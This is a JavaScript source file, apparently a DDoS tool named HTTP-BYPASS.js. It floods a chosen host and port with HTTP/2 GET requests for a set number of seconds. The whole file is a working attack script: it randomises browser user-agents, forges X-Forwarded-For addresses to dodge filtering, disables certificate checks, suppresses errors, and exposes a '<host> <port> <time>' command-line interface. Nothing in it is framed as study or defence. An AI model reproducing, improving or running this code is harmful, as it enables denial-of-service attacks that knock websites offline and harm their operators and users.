const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const crypto = require('crypto');
const url = require('url');

class HTTPBypass {
  constructor() {
    this.ciphers = [
      "TLS_AES_128_GCM_SHA256",
      "TLS_CHACHA20_POLY1305_SHA256",
      "TLS_AES_256_GCM_SHA384"
    ].join(':');
    
    this.secureOptions = 
      crypto.constants.SSL_OP_NO_SSLv2 |
      crypto.constants.SSL_OP_NO_SSLv3 |
      crypto.constants.SSL_OP_NO_TLSv1 |
      crypto.constants.SSL_OP_NO_TLSv1_1;
  }

  randomIP() {
    return Array.from({length: 4}, () => Math.floor(Math.random() * 255)).join('.');
  }

  getUserAgent() {
    const browsers = [
      {
        name: 'chrome',
        template: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(90 + Math.random() * 30)}.0.${Math.floor(1000 + Math.random() * 4000)}.${Math.floor(100 + Math.random() * 100)} Safari/537.36`
      },
      {
        name: 'firefox',
        template: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${Math.floor(80 + Math.random() * 30)}.0) Gecko/20100101 Firefox/${Math.floor(80 + Math.random() * 30)}.0`
      },
      {
        name: 'edge', 
        template: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(90 + Math.random() * 30)}.0.${Math.floor(1000 + Math.random() * 4000)}.${Math.floor(100 + Math.random() * 100)} Safari/537.36 Edg/${Math.floor(90 + Math.random() * 30)}.0.${Math.floor(1000 + Math.random() * 1000)}.0`
      }
    ];
    
    return browsers[Math.floor(Math.random() * browsers.length)].template;
  }

  generateHeaders(host) {
    const headers = {
      ':method': 'GET',
      ':path': '/',
      ':authority': host,
      ':scheme': 'https',
      'user-agent': this.getUserAgent(),
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
      'accept-language': 'en-US,en;q=0.9',
      'accept-encoding': 'gzip, deflate, br',
      'cache-control': 'no-cache',
      'x-forwarded-for': this.randomIP()
    };

    // Random additional headers
    if (Math.random() > 0.5) {
      headers['x-request-id'] = crypto.randomBytes(8).toString('hex');
    }
    if (Math.random() > 0.7) {
      headers['x-custom-header'] = 'value-' + Math.random().toString(36).substring(2, 8);
    }

    return headers;
  }

  async attack(target, port, duration) {
    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);
    
    console.log(`Starting attack on ${target}:${port} for ${duration} seconds`);

    while (Date.now() < endTime) {
      try {
        const socket = net.connect({
          host: target,
          port: port
        });

        const tlsSocket = tls.connect({
          socket: socket,
          host: target,
          servername: target,
          ciphers: this.ciphers,
          secureOptions: this.secureOptions,
          rejectUnauthorized: false
        });

        const client = http2.connect(`https://${target}:${port}`, {
          createConnection: () => tlsSocket
        });

        const headers = this.generateHeaders(target);
        const req = client.request(headers);

        req.on('response', () => req.close());
        req.on('error', () => {});
        req.end();

        // Delay between requests
        await new Promise(resolve => setTimeout(resolve, 100));
      } catch (err) {
        // Silently handle errors
      }
    }

    console.log('Attack completed');
  }
}

// Command line execution
if (require.main === module) {
  if (process.argv.length < 5) {
    console.log('Usage: node HTTP-BYPASS.js <host> <port> <time>');
    process.exit(1);
  }

  const host = process.argv[2];
  const port = parseInt(process.argv[3]);
  const time = parseInt(process.argv[4]);

  const bypass = new HTTPBypass();
  bypass.attack(host, port, time)
    .then(() => process.exit(0))
    .catch(err => {
      console.error('Error:', err);
      process.exit(1);
    });
}

module.exports = HTTPBypass;